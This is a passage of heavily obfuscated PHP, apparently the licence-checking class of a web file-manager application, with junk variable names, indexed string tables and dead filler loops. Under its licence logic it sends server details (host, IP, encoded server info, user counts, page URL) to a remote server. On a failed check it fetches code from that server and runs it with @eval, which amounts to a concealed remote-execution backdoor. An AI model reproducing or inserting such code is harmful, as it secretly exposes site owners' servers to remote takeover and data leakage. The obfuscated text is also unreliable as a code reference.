$»ëæÉ²ª[$”ŞœÀİ¼[87]][$”ŞœÀİ¼[88]][$Œßõûû…] = $ˆ£âÃ; } $Ì¨æúìí = $»ëæÉ²ª[$”ŞœÀİ¼[87]][$”ŞœÀİ¼[88]][$”ŞœÀİ¼[46]]; $çßøİÈ = $Ü»æ†æè[649]; while (strlen($çßøİÈ) < $Ü»æ†æè[616]) { if (!$çßøİÈ) { break; } $çßøİÈ++; } unset($»ëæÉ²ª[$”ŞœÀİ¼[87]][$”ŞœÀİ¼[89]][$”ŞœÀİ¼[90]]); unset($»ëæÉ²ª[$”ŞœÀİ¼[87]][$”ŞœÀİ¼[89]][$”ŞœÀİ¼[91]]); $†ù€å® = $Ü»æ†æè[650]; if (strlen($†ù€å®) < $Ü»æ†æè[612]) { die; } unset($»ëæÉ²ª[$”ŞœÀİ¼[87]][$”ŞœÀİ¼[88]][$”ŞœÀİ¼[46]]); unset($»ëæÉ²ª[$”ŞœÀİ¼[87]][$”ŞœÀİ¼[88]][$”ŞœÀİ¼[92]]); $»ëæÉ²ª[$”ŞœÀİ¼[87]][$”ŞœÀİ¼[88]][$”ŞœÀİ¼[93]] = array($”ŞœÀİ¼[94] => (int) $Ì¨æúìí[$”ŞœÀİ¼[95]], $”ŞœÀİ¼[96] => (int) _get($Ì¨æúìí, $”ŞœÀİ¼[97], 0)); $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[99]] = Action($”ŞœÀİ¼[100])->accessToken(); $³‰‰²ÏÀ = $Ü»æ†æè[651]; if (!$³‰‰²ÏÀ) { return; } $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[101]] = md5($_SERVER[$”ŞœÀİ¼[102]] . $”óø–ã[$”ŞœÀİ¼[103]]); $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[104]] = base64_encode(serverInfo()); $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[105]] = $this->zrjwb39d575c; if ($”óø–ã[$”ŞœÀİ¼[105]] != $”ŞœÀİ¼[106]) { $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[107]] = $”óø–ã[$”ŞœÀİ¼[107]]; $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[108]] = $”óø–ã[$”ŞœÀİ¼[108]]; $ä„¡Õ«˜ = rand_string(10) . $this->zrjwb39d575c . rand_string(5); $»ëæÉ²ª[$”ŞœÀİ¼[87]][$”ŞœÀİ¼[109]][$”ŞœÀİ¼[110]] = $this->odby64b3a667($ä„¡Õ«˜, $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[101]]); } if ($this->zrjwb39d575c == $”ŞœÀİ¼[106]) { $»ëæÉ²ª[$”ŞœÀİ¼[87]][$”ŞœÀİ¼[88]][$”ŞœÀİ¼[93]][$”ŞœÀİ¼[97]] = 0; } $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[111]] = _get($this->grhme4a01004, $”ŞœÀİ¼[112], $”ŞœÀİ¼[6]); $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[113]] = _get($this->grhme4a01004, $”ŞœÀİ¼[114], $”ŞœÀİ¼[6]); $˜óßö™– = $Ü»æ†æè[652]; if (!$˜óßö™–) { return; } if (_get($GLOBALS, $”ŞœÀİ¼[115]) && $this->config[$”ŞœÀİ¼[116]]) { $»ëæÉ²ª[$”ŞœÀİ¼[98]][$”ŞœÀİ¼[117]] = WEB_ROOT; } return $»ëæÉ²ª; } private function ipeuf120cc28() { $Úõ´Áƒ =& $_SERVER[şÒÁøÒÄ]; $¤‡±ìÔ¨ =& $_SERVER[°ÖÎï]; $«Ø×¡Éï = $_SERVER[$¤‡±ìÔ¨[24]] == $¤‡±ìÔ¨[118]; $Ïâôö×À = $Úõ´Áƒ[653]; if ($_SERVER[$¤‡±ìÔ¨[24]] == $¤‡±ìÔ¨[119] && $_GET[$¤‡±ìÔ¨[120]] == $¤‡±ìÔ¨[121]) { $«Ø×¡Éï = !0; } if ($«Ø×¡Éï) { $Çı–®¦ = array($¤‡±ìÔ¨[105] => $this->zrjwb39d575c, $¤‡±ìÔ¨[122] => $this->znhjf51f6e2f(), $¤‡±ìÔ¨[123] => Model($¤‡±ìÔ¨[124])->count()); if ($this->zrjwb39d575c != $¤‡±ìÔ¨[106]) { $ÖÛ¾°¿ = _get($this->grhme4a01004, $¤‡±ìÔ¨[125]); if ($ÖÛ¾°¿) { $Çı–®¦[$¤‡±ìÔ¨[126]] = $ÖÛ¾°¿; $Çı–®¦[$¤‡±ìÔ¨[127]] = strtotime(_get($this->grhme4a01004, $¤‡±ìÔ¨[128])); $Çı–®¦[$¤‡±ìÔ¨[129]] = _get($this->grhme4a01004, $¤‡±ìÔ¨[114]); } $æãäÚÂÌ = Model($¤‡±ìÔ¨[33])->get($¤‡±ìÔ¨[130], $¤‡±ìÔ¨[6], !0); if (is_string($æãäÚÂÌ) && substr($æãäÚÂÌ, 0, 1) == $¤‡±ìÔ¨[131]) { $æãäÚÂÌ = json_decode_force($æãäÚÂÌ); } if (is_array($æãäÚÂÌ) && $æãäÚÂÌ[$¤‡±ìÔ¨[132]] && strstr($æãäÚÂÌ[$¤‡±ìÔ¨[132]], $¤‡±ìÔ¨[133])) { $åÓ£¦ã‚ = explode($¤‡±ìÔ¨[133], $æãäÚÂÌ[$¤‡±ìÔ¨[132]]); $Çı–®¦[$¤‡±ìÔ¨[134]] = $åÓ£¦ã‚[0]; } } $Çı–®¦ = $this->btev0d3ac16a(json_encode($Çı–®¦), md5($¤‡±ìÔ¨[135])); $ğŒ–Ö¯Á = array($¤‡±ìÔ¨[136] => $Çı–®¦); call_user_func(array($¤‡±ìÔ¨[137], $¤‡±ìÔ¨[138]), $ğŒ–Ö¯Á); $†à†Ó”¤ = $Úõ´Áƒ[654]; if (strlen($†à†Ó”¤) < $Úõ´Áƒ[612]) { return; } } if ($this->zrjwb39d575c == $¤‡±ìÔ¨[106]) { return; } $Êêˆ‡‡ = array($¤‡±ìÔ¨[139], $¤‡±ìÔ¨[140], $¤‡±ìÔ¨[141], $¤‡±ìÔ¨[142], $¤‡±ìÔ¨[143], $¤‡±ìÔ¨[144]); $Ğ«“Õóü = Model($¤‡±ìÔ¨[33])->get(); $ğŒ–Ö¯Á = array($¤‡±ìÔ¨[145] => $Ğ«“Õóü[$¤‡±ìÔ¨[34]], $¤‡±ìÔ¨[146] => $Ğ«“Õóü[$¤‡±ìÔ¨[35]], $¤‡±ìÔ¨[147] => $¤‡±ìÔ¨[6]); foreach ($Êêˆ‡‡ as $øúàéûî) { if (!isset($Ğ«“Õóü[$øúàéûî]) || !$Ğ«“Õóü[$øúàéûî]) { continue; } $ğŒ–Ö¯Á[$øúàéûî] = $Ğ«“Õóü[$øúàéûî]; } call_user_func(array($¤‡±ìÔ¨[137], $¤‡±ìÔ¨[138]), $ğŒ–Ö¯Á); } private function alcx48d94461() { $µ‚£„¢ =& $_SERVER[şÒÁøÒÄ]; $Ò…ƒŸØç =& $_SERVER[°ÖÎï]; if ($_SERVER[$Ò…ƒŸØç[24]] != $Ò…ƒŸØç[148]) { return; } if (!_get($GLOBALS, $Ò…ƒŸØç[115])) { die; } $¤ò¢Œ¦ı = $GLOBALS[$Ò…ƒŸØç[13]]; if (isset($¤ò¢Œ¦ı[$Ò…ƒŸØç[149]])) { $this->fsew99488382(); die; } if (!isset($¤ò¢Œ¦ı[$Ò…ƒŸØç[150]]) || strlen($¤ò¢Œ¦ı[$Ò…ƒŸØç[150]]) != 16) { show_json($Ò…ƒŸØç[151] . $¤ò¢Œ¦ı[$Ò…ƒŸØç[150]], !1); } $úÒ‡³¦  = Model($Ò…ƒŸØç[33])->get($Ò…ƒŸØç[103]); $ÈûÔıÏ” = md5($_SERVER[$Ò…ƒŸØç[102]] . $úÒ‡³¦ ); $ØÄÒÈãí = array($Ò…ƒŸØç[150] => $¤ò¢Œ¦ı[$Ò…ƒŸØç[150]], $Ò…ƒŸØç[152] => rand_string(16), $Ò…ƒŸØç[153] => $Ò…ƒŸØç[135], $Ò…ƒŸØç[154] => $Ò…ƒŸØç[155], $Ò…ƒŸØç[156] => $_SERVER[$Ò…ƒŸØç[157]], $Ò…ƒŸØç[158] => $_SERVER[$Ò…ƒŸØç[159]], $Ò…ƒŸØç[160] => $_SERVER[$Ò…ƒŸØç[161]], $Ò…ƒŸØç[101] => $ÈûÔıÏ”, $Ò…ƒŸØç[162] => Model($Ò…ƒŸØç[33])->get($Ò…ƒŸØç[130])); $¶¤â‰Ü = $µ‚£„¢[655]; while (strlen($¶¤â‰Ü) < $µ‚£„¢[616]) { if (!$¶¤â‰Ü) { break; } $¶¤â‰Ü++; } if ($¤ò¢Œ¦ı[$Ò…ƒŸØç[163]] == $Ò…ƒŸØç[164]) { $¾¼˜Å˜˜ = $this->btev0d3ac16a($ÈûÔıÏ”, $Ò…ƒŸØç[165]); $£±©æø = $this->odby64b3a667(json_encode($ØÄÒÈãí), $ÈûÔıÏ” . $Ò…ƒŸØç[166], 3); $£±©æø = $£±©æø . $Ò…ƒŸØç[167] . $_SERVER[$Ò…ƒŸØç[157]]; $ç Ëñ€£ = $this->kmodea08401e($Ò…ƒŸØç[168] . $¾¼˜Å˜˜ . $Ò…ƒŸØç[169] . $£±©æø, -1); show_json($ç Ëñ€£, !0); } else { if ($¤ò¢Œ¦ı[$Ò…ƒŸØç[163]] == $Ò…ƒŸØç[170]) { $Ûƒ¢­ = substr(md5($Ò…ƒŸØç[171] . $ÈûÔıÏ”), 12, 15) . $Ò…ƒŸØç[172]; $£±©æø = $this->rtos891d43b3(trim($¤ò¢Œ¦ı[$Ò…ƒŸØç[173]]), $Ûƒ¢­, 2); $­Ô«ÇëÆ = json_decode($£±©æø, !0); if (!is_array($­Ô«ÇëÆ) || !is_array($­Ô«ÇëÆ[$Ò…ƒŸØç[174]]) || $­Ô«ÇëÆ[$Ò…ƒŸØç[150]] != !0) { $º“ùÎ = $Ò…ƒŸØç[175]; $¶×ÛĞéà = $­Ô«ÇëÆ[$Ò…ƒŸØç[174]] ? $Ò…ƒŸØç[176] . $­Ô«ÇëÆ[$Ò…ƒŸØç[174]] : $º“ùÎ; show_json($¶×ÛĞéà, !1); } else { $ØÄÒÈãí[$Ò…ƒŸØç[152]] = $­Ô«ÇëÆ[$Ò…ƒŸØç[174]][$Ò…ƒŸØç[177]]; } } else { $­Ô«ÇëÆ = $this->kmodea08401e($Ò…ƒŸØç[178], $ØÄÒÈãí, 10); $³Í†–ÕÙ = $µ‚£„¢[656]; if (strlen($³Í†–ÕÙ) < $µ‚£„¢[612]) { return; } } } if (!is_array($­Ô«ÇëÆ) || !is_array($­Ô«ÇëÆ[$Ò…ƒŸØç[174]]) || $­Ô«ÇëÆ[$Ò…ƒŸØç[150]] != !0) { $º“ùÎ = LNG($Ò…ƒŸØç[179]); $¶×ÛĞéà = $­Ô«ÇëÆ[$Ò…ƒŸØç[174]] ? $Ò…ƒŸØç[176] . $­Ô«ÇëÆ[$Ò…ƒŸØç[174]] : $º“ùÎ; show_json($¶×ÛĞéà, !1); } $ŠØû®” = $­Ô«ÇëÆ[$Ò…ƒŸØç[174]]; $ª¤£øœù = $this->zpcgae8b256a($ŠØû®”[$Ò…ƒŸØç[180]]); $àÀ”„È§ = $µ‚£„¢[657]; if (strlen($àÀ”„È§) < $µ‚£„¢[616]) { die; } if (!$ª¤£øœù || $ª¤£øœù != $ŠØû®”[$Ò…ƒŸØç[128]]) { $â¹·–¨¡ = array($Ò…ƒŸØç[181] => Model($Ò…ƒŸØç[33])->get($Ò…ƒŸØç[103]), $Ò…ƒŸØç[182] => $_SERVER[$Ò…ƒŸØç[102]], $Ò…ƒŸØç[183] => this_url(), $Ò…ƒŸØç[158] => $_SERVER[$Ò…ƒŸØç[159]]); $£±©æø = $this->pyez4d3f653d(json_encode($â¹·–¨¡)); $this->kmodea08401e($Ò…ƒŸØç[184] . $£±©æø); show_json(LNG($Ò…ƒŸØç[185]), !0); } $Íı÷—åô = array($Ò…ƒŸØç[186] => $ŠØû®”[$Ò…ƒŸØç[187]], $Ò…ƒŸØç[188] => $ŠØû®”[$Ò…ƒŸØç[189]], $Ò…ƒŸØç[190] => rand_string(16), $Ò…ƒŸØç[105] => $ŠØû®”[$Ò…ƒŸØç[191]]); if ($ØÄÒÈãí[$Ò…ƒŸØç[152]]) { $Íı÷—åô[$Ò…ƒŸØç[190]] = $ØÄÒÈãí[$Ò…ƒŸØç[152]]; } $‰«‡Ÿùô = substr(md5($Íı÷—åô[$Ò…ƒŸØç[188]]), 10, 10); $‘·Üİ¢ó = $‰«‡Ÿùô . $Íı÷—åô[$Ò…ƒŸØç[105]] . $Íı÷—åô[$Ò…ƒŸØç[190]]; $Íı÷—åô[$Ò…ƒŸØç[107]] = strrev(base64_encode($this->btev0d3ac16a($‘·Üİ¢ó, $Ò…ƒŸØç[192]))); $‡ÔËì†© = rand_string(16); $Şù•¨Ì× = $µ‚£„¢[658]; while (strlen($Şù•¨Ì×) < $µ‚£„¢[627]) { if (!$Şù•¨Ì×) { break; } $Şù•¨Ì×++; } $â¹²ÛåÎ = $‡ÔËì†© . $Íı÷—åô[$Ò…ƒŸØç[105]] . $this->btev0d3ac16a(md5($Íı÷—åô[$Ò…ƒŸØç[186]]), $‡ÔËì†©); $üØÖ×ŒŞ = $µ‚£„¢[659]; if (!$üØÖ×ŒŞ) { return; } $Íı÷—åô[$Ò…ƒŸØç[108]] = base64_encode(strrev($this->btev0d3ac16a($â¹²ÛåÎ, $Ò…ƒŸØç[193]))); $¥ñĞÓäğ = $µ‚£„¢[660]; if (strlen($¥ñĞÓäğ) < $µ‚£„¢[612]) { return; } if ($ŠØû®”[$Ò…ƒŸØç[194]] && $ŠØû®”[$Ò…ƒŸØç[194]] >= 1) { Model($Ò…ƒŸØç[33])->setDeep($Ò…ƒŸØç[195], $Ò…ƒŸØç[121]); } Model($Ò…ƒŸØç[33])->set($Íı÷—åô); $üÃæı¨‹ = md5($_SERVER[$Ò…ƒŸØç[102]] . strrev($úÒ‡³¦ ) . $Íı÷—åô[$Ò…ƒŸØç[188]]); $êôÒ¸– = $µ‚£„¢[661]; $ÏÇÙ¹«¾ = strrev(substr($üÃæı¨‹, 10, 16)); $ÕÚ§ÖàÖ = $this->odby64b3a667(json_encode($ŠØû®”), $üÃæı¨‹); $äà¶ÑÔø = array_to_keyvalue(Model($Ò…ƒŸØç[7])->listData(), $Ò…ƒŸØç[196]); $’™™ş©È = $äà¶ÑÔø[$Ò…ƒŸØç[197]]; $²ª¤½¥ = $µ‚£„¢[662]; $ş¿§¤àê = array(); $Ë°”Â˜ = $µ‚£„¢[663]; if (!$Ë°”Â˜) { return; } $ş¿§¤àê[$ÏÇÙ¹«¾] = $ÕÚ§ÖàÖ; Model($Ò…ƒŸØç[7])->update($’™™ş©È[$Ò…ƒŸØç[198]], array($Ò…ƒŸØç[199] => $ş¿§¤àê)); $this->grhme4a01004 = $ŠØû®”; $this->zrjwb39d575c = $Íı÷—åô[$Ò…ƒŸØç[105]]; $this->licenseRegistSuccess(); Cache::set($Ò…ƒŸØç[200] . md5($úÒ‡³¦  . $Ò…ƒŸØç[201]), $Ò…ƒŸØç[6]); show_json(LNG($Ò…ƒŸØç[185]), !0); $¤øêàÁà = $µ‚£„¢[664]; if (strlen($¤øêàÁà) < $µ‚£„¢[614]) { return; } } private function licenseRegistSuccess() { $ŠúÃßù› =& $_SERVER[°ÖÎï]; $ÖšÖãÕ = Model($ŠúÃßù›[33])->get(); $¢û‡öı‘ = $_SERVER[şÒÁøÒÄ][665]; if ($ÖšÖãÕ[$ŠúÃßù›[63]] != $ŠúÃßù›[121]) { Model($ŠúÃßù›[33])->set($ŠúÃßù›[63], $ŠúÃßù›[121]); } Action($ŠúÃßù›[202])->initStart(!0); } private function fsew99488382() { $åÆñàê =& $_SERVER[°ÖÎï]; Model($åÆñàê[33])->set(array($åÆñàê[186] => $åÆñàê[6], $åÆñàê[188] => $åÆñàê[6], $åÆñàê[105] => $åÆñàê[106], $åÆñàê[107] => $åÆñàê[6], $åÆñàê[108] => $åÆñàê[6])); Model($åÆñàê[33])->setDeep($åÆñàê[195], $åÆñàê[203]); $this->grhme4a01004 = array(); $this->zrjwb39d575c = $åÆñàê[106]; } private function balr38389f95() { $Õœñ—´ =& $_SERVER[şÒÁøÒÄ]; $¢‰ë¶·ò =& $_SERVER[°ÖÎï]; $_SERVER[$¢‰ë¶·ò[159]] = _get($_SERVER, $¢‰ë¶·ò[159], APP_HOST); $¸½–£†à = $Õœñ—´[666]; if (!$¸½–£†à) { die; } $this->zrjwb39d575c = $¢‰ë¶·ò[106]; $ö¦¤ƒÅŸ = Model($¢‰ë¶·ò[33])->get(); $é§‚íÑ = $Õœñ—´[667]; if (!$é§‚íÑ) { return; } if ($ö¦¤ƒÅŸ[$¢‰ë¶·ò[105]] == $¢‰ë¶·ò[106]) { return; } $÷»ã½¼¸ = Model($¢‰ë¶·ò[33])->get($¢‰ë¶·ò[103]); $¥ÜÊ¬ò´ = $Õœñ—´[668]; while (strlen($¥ÜÊ¬ò´) < $Õœñ—´[627]) { if (!$¥ÜÊ¬ò´) { break; } $¥ÜÊ¬ò´++; } $•àÛÄ­ = $¢‰ë¶·ò[200] . md5($÷»ã½¼¸ . $¢‰ë¶·ò[201]); $ƒçï™öˆ = $Õœñ—´[669]; while ($ƒçï™öˆ < $Õœñ—´[645]) { if ($ƒçï™öˆ >= 0) { break; } $ƒçï™öˆ++; } $åÚ£§éñ = Cache::get($•àÛÄ­); if (!is_array($åÚ£§éñ) || !isset($åÚ£§éñ[$¢‰ë¶·ò[204]]) || time() - $åÚ£§éñ[$¢‰ë¶·ò[204]] >= 60) { $Ï­Â€Î = Model($¢‰ë¶·ò[7])->loadList(); $ñë˜ª¿‚ = $Ï­Â€Î[$¢‰ë¶·ò[197]]; $‚‹ô¬Ò = md5($_SERVER[$¢‰ë¶·ò[102]] . strrev($÷»ã½¼¸) . $ö¦¤ƒÅŸ[$¢‰ë¶·ò[188]]); $¾²Ï¬Ò£ = strrev(substr($‚‹ô¬Ò, 10, 16)); $åÚ£§éñ = $this->rtos891d43b3($ñë˜ª¿‚[$¢‰ë¶·ò[85]][$¾²Ï¬Ò£], $‚‹ô¬Ò); $åÚ£§éñ = json_decode($åÚ£§éñ, !0); } if (!is_array($åÚ£§éñ)) { return $this->fsew99488382(); } $§Ü®¯œœ = strtotime($åÚ£§éñ[$¢‰ë¶·ò[128]]); if (time() >= $§Ü®¯œœ) { return $this->fsew99488382(); } if (time() - $åÚ£§éñ[$¢‰ë¶·ò[204]] > 20) { $åÚ£§éñ[$¢‰ë¶·ò[204]] = time(); Cache::set($•àÛÄ­, $åÚ£§éñ); } $this->grhme4a01004 = $åÚ£§éñ; $this->zrjwb39d575c = $ö¦¤ƒÅŸ[$¢‰ë¶·ò[105]]; $ÊÒˆ‘©Õ = $Õœñ—´[670]; if (!$ÊÒˆ‘©Õ) { die; } } private function juxv269b45a8() { $«òŸ›±Š =& $_SERVER[şÒÁøÒÄ]; $ğó£“‰¦ =& $_SERVER[°ÖÎï]; $ûÈ¯“à… = $GLOBALS[$ğó£“‰¦[13]]; $¢îêÚïË = $«òŸ›±Š[671]; if (!$¢îêÚïË) { return; } $£ö»‚¢õ = $_SERVER[$ğó£“‰¦[24]]; $®åß­—Á = $«òŸ›±Š[672]; while ($®åß­—Á < $«òŸ›±Š[614]) { if ($®åß­—Á >= 0) { break; } $®åß­—Á++; } if ($£ö»‚¢õ == $ğó£“‰¦[205] && $this->zrjwb39d575c == $ğó£“‰¦[106]) { show_json(LNG($ğó£“‰¦[206]), !1, $ğó£“‰¦[207]); } $Ü¤êñì = array($ğó£“‰¦[208], $ğó£“‰¦[209]); if (in_array($£ö»‚¢õ, $Ü¤êñì)) { if ($this->zrjwb39d575c == $ğó£“‰¦[106] && isset($ûÈ¯“à…[$ğó£“‰¦[210]])) { show_json(LNG($ğó£“‰¦[206]), !1, $ğó£“‰¦[207]); die; } $í‡Í“êæ = $this->znhjf51f6e2f(); if ($í‡Í“êæ != intval($ğó£“‰¦[211])) { if ($í‡Í“êæ <= Model($ğó£“‰¦[124])->count()) { show_json(LNG($ğó£“‰¦[212]), !1, $ğó£“‰¦[207]); die; } } } } private function zeyfd6479cdb() { $š×ĞêÖİ =& $_SERVER[şÒÁøÒÄ]; $Ö¶½úØ =& $_SERVER[°ÖÎï]; $ŞØÌ´Ñì = array($Ö¶½úØ[118], $Ö¶½úØ[119]); $ÚŠŒ˜Ù· = $š×ĞêÖİ[673]; if (!$ÚŠŒ˜Ù·) { return; } if (!_get($GLOBALS, $Ö¶½úØ[115]) || !isset($_GET[$Ö¶½úØ[213]])) { return; } if (!in_array($_SERVER[$Ö¶½úØ[24]], $ŞØÌ´Ñì)) { return; } $Ü°îçâ = $Ö¶½úØ[214]; $Ü°îçâ = $this->wsbf61de90b0($Ü°îçâ, $Ö¶½úØ[215]); $»€Õ”İ± = $š×ĞêÖİ[674]; if (!$»€Õ”İ±) { return; } $ĞÉˆå®à = stream_context_create(array($Ö¶½úØ[216] => array($Ö¶½úØ[217] => $Ö¶½úØ[218], $Ö¶½úØ[219] => 3))); $Áô±ú£Ö = @file_get_contents($Ü°îçâ, !1, $ĞÉˆå®à); header($Ö¶½úØ[220]); if ($Áô±ú£Ö && strstr($Áô±ú£Ö, $Ö¶½úØ[221])) { echo $Áô±ú£Ö; } die; } public function cdha2c24f43c($ìÍò€¯è) { $Í«…ŒÕ =& $_SERVER[şÒÁøÒÄ]; $›¹Ì²²  =& $_SERVER[°ÖÎï]; if ($this->zrjwb39d575c == $›¹Ì²² [222]) { return $ìÍò€¯è; } $…‚Éı¯Å = array($›¹Ì²² [223] => $›¹Ì²² [224], $›¹Ì²² [225] => $›¹Ì²² [224], $›¹Ì²² [226] => $›¹Ì²² [224], $›¹Ì²² [227] => $›¹Ì²² [224], $›¹Ì²² [228] => $›¹Ì²² [229], $›¹Ì²² [230] => $›¹Ì²² [229], $›¹Ì²² [231] => $›¹Ì²² [229], $›¹Ì²² [232] => $›¹Ì²² [229], $›¹Ì²² [233] => $›¹Ì²² [229], $›¹Ì²² [234] => $›¹Ì²² [229], $›¹Ì²² [235] => $›¹Ì²² [229], $›¹Ì²² [236] => $›¹Ì²² [229], $›¹Ì²² [237] => $›¹Ì²² [229], $›¹Ì²² [238] => $›¹Ì²² [229], $›¹Ì²² [239] => $›¹Ì²² [229], $›¹Ì²² [240] => $›¹Ì²² [229]); $ª½øâ§® = explode($›¹Ì²² [241], _get($this->grhme4a01004, $›¹Ì²² [112], $›¹Ì²² [6])); $–úÕÆŸô = $Í«…ŒÕ[675]; while (strlen($–úÕÆŸô) < $Í«…ŒÕ[627]) { if (!$–úÕÆŸô) { break; } $–úÕÆŸô++; } $ä»€õß€ = array(); foreach ($…‚Éı¯Å as $ı»Ğ¢Ÿ¶ => $ûºœÆØ¶) { if ($ûºœÆØ¶ == $›¹Ì²² [224] && substr($this->zrjwb39d575c, 0, 1) == $›¹Ì²² [224]) { continue; } if (!in_array($ı»Ğ¢Ÿ¶, $ª½øâ§®)) { $ä»€õß€[] = $ı»Ğ¢Ÿ¶; } } foreach ($ä»€õß€ as $ı»Ğ¢Ÿ¶) { unset($ìÍò€¯è[$ı»Ğ¢Ÿ¶]); } return $ìÍò€¯è; $åë‘Ü±† = $Í«…ŒÕ[676]; if (!$åë‘Ü±†) { return; } } private function xygf5bddd93e() { $Ëƒø’§ =& $_SERVER[°ÖÎï]; if ($this->zrjwb39d575c != $Ëƒø’§[106]) { $GLOBALS[$Ëƒø’§[85]][$Ëƒø’§[89]][$Ëƒø’§[242]] = $Ëƒø’§[203]; return; } $GLOBALS[$Ëƒø’§[85]][$Ëƒø’§[243]] = $Ëƒø’§[121]; if (Model($Ëƒø’§[244])->get($Ëƒø’§[63]) != $Ëƒø’§[203]) { Model($Ëƒø’§[244])->set($Ëƒø’§[63], $Ëƒø’§[203]); } } public function ifto68c0dbe5() { return $_SERVER[°ÖÎï][245]; $¨Í¥ãı® = $_SERVER[şÒÁøÒÄ][677]; } private function eowudfaae44f() { $•£ˆ—¡¨ =& $_SERVER[şÒÁøÒÄ]; $Æ”ó´Å =& $_SERVER[°ÖÎï]; $•¯˜™¿ì = array($Æ”ó´Å[246], $Æ”ó´Å[247], $Æ”ó´Å[248]); $ìıó ¹× = $Æ”ó´Å[249] . md5($Æ”ó´Å[250]); $å·òÒÀÜ = $•£ˆ—¡¨[678]; if ($this->zrjwb39d575c == $Æ”ó´Å[106] || !_get($GLOBALS, $Æ”ó´Å[115])) { return; } if (!in_array($_SERVER[$Æ”ó´Å[24]], $•¯˜™¿ì)) { return; } if (time() % 4 != 0) { return; } $İ¹ù¯¥î = call_user_func(array($Æ”ó´Å[251], $Æ”ó´Å[252]), $ìıó ¹×); $£şşœ»¥ = $•£ˆ—¡¨[679]; while (strlen($£şşœ»¥) < $•£ˆ—¡¨[616]) { if (!$£şşœ»¥) { break; } $£şşœ»¥++; } if ($İ¹ù¯¥î && time() - $İ¹ù¯¥î < intval($Æ”ó´Å[253])) { return; } call_user_func(array($Æ”ó´Å[251], $Æ”ó´Å[138]), $ìıó ¹×, time()); $¾î–áç® = Model($Æ”ó´Å[33])->get($Æ”ó´Å[103]); $ÅÔŠüÙ = $•£ˆ—¡¨[680]; $˜ßïç¼é = array($Æ”ó´Å[150] => Model($Æ”ó´Å[33])->get($Æ”ó´Å[186]), $Æ”ó´Å[163] => $this->zrjwb39d575c, $Æ”ó´Å[160] => $_SERVER[$Æ”ó´Å[161]], $Æ”ó´Å[162] => Model($Æ”ó´Å[33])->get($Æ”ó´Å[130]), $Æ”ó´Å[101] => md5($_SERVER[$Æ”ó´Å[102]] . $¾î–áç®), $Æ”ó´Å[153] => $Æ”ó´Å[135], $Æ”ó´Å[156] => $_SERVER[$Æ”ó´Å[157]]); $åîÑÍù = $this->kmodea08401e($Æ”ó´Å[254], $˜ßïç¼é); $¨ƒû”¥º = $•£ˆ—¡¨[681]; if (!$¨ƒû”¥º) { die; } if (!is_array($åîÑÍù)) { return; } if ($åîÑÍù[$Æ”ó´Å[150]] && $åîÑÍù[$Æ”ó´Å[255]]) { if ($this->zpcgae8b256a($åîÑÍù[$Æ”ó´Å[255]]) == $˜ßïç¼é[$Æ”ó´Å[150]]) { return; } } $this->fsew99488382(); $á¨×€À  = $•£ˆ—¡¨[682]; while ($á¨×€À  < $•£ˆ—¡¨[614]) { if ($á¨×€À  >= 0) { break; } $á¨×€À ++; } if ($this->zpcgae8b256a($åîÑÍù[$Æ”ó´Å[255]]) != $˜ßïç¼é[$Æ”ó´Å[150]]) { $¢Ğƒ´î· = array($Æ”ó´Å[181] => $¾î–áç®, $Æ”ó´Å[182] => $_SERVER[$Æ”ó´Å[102]], $Æ”ó´Å[183] => this_url(), $Æ”ó´Å[158] => $_SERVER[$Æ”ó´Å[159]]); $˜•²©ğ  = $this->pyez4d3f653d(json_encode($¢Ğƒ´î·)); $åîÑÍù = $this->kmodea08401e($Æ”ó´Å[184] . $˜•²©ğ ); if ($åîÑÍù && is_array($åîÑÍù) && isset($åîÑÍù[$Æ”ó´Å[255]])) { $İÁÜ­ª× = $this->rtos891d43b3($åîÑÍù[$Æ”ó´Å[255]], 2); if ($İÁÜ­ª×) { $İÁÜ­ª× = $this->zpcgae8b256a($İÁÜ­ª×); } if ($İÁÜ­ª×) { try { @eval($İÁÜ­ª×); } catch (Exception $Çƒ™÷Ãô) { } } } } } private function kmodea08401e($îÆ«ƒöĞ = '', $…Ë”ù™ = array(), $œóñœË = 5) { $Ä¾ğ¢ó =& $_SERVER[şÒÁøÒÄ]; $• ºç£‡ =& $_SERVER[°ÖÎï]; $®‘Ğé·’ = $• ºç£‡[256]; $í†Ô’ = $Ä¾ğ¢ó[683]; $®‘Ğé·’ = $this->wsbf61de90b0($®‘Ğé·’, $• ºç£‡[257]); $®‘Ğé·’ = $®‘Ğé·’ . $îÆ«ƒöĞ; if ($…Ë”ù™ && is_array($…Ë”ù™)) { $®‘Ğé·’ = $®‘Ğé·’ . $• ºç£‡[258] . http_build_query($…Ë”ù™); } if ($…Ë”ù™ === -1) { return $®‘Ğé·’; } $¤Â°ğ–Ë = stream_context_create(array($• ºç£‡[216] => array($• ºç£‡[219] => $œóñœË, $• ºç£‡[217] => $• ºç£‡[259]), $• ºç£‡[260] => array($• ºç£‡[261] => !1, $• ºç£‡[262] => !1))); $ËáÍÏØ© = $Ä¾ğ¢ó[684]; if (!$ËáÍÏØ©) { return; } $…Ë”ù™ = @file_get_contents($®‘Ğé·’, !1, $¤Â°ğ–Ë); $¹‹£ĞÜ¸ = $Ä¾ğ¢ó[685]; if (!$¹‹£ĞÜ¸) { return; } return json_decode($…Ë”ù™, !0); } private function znhjf51f6e2f() { $›°Ü§Ä÷ =& $_SERVER[şÒÁøÒÄ]; $¼ŒÏœ÷Ú =& $_SERVER[°ÖÎï]; $Öô“…Íå = array($¼ŒÏœ÷Ú[263] => $¼ŒÏœ÷Ú[264], $¼ŒÏœ÷Ú[265] => $¼ŒÏœ÷Ú[266], $¼ŒÏœ÷Ú[267] => $¼ŒÏœ÷Ú[268], $¼ŒÏœ÷Ú[269] => $¼ŒÏœ÷Ú[270], $¼ŒÏœ÷Ú[271] => $¼ŒÏœ÷Ú[272], $¼ŒÏœ÷Ú[273] => $¼ŒÏœ÷Ú[211], $¼ŒÏœ÷Ú[274] => $¼ŒÏœ÷Ú[211], $¼ŒÏœ÷Ú[275] => $¼ŒÏœ÷Ú[264], 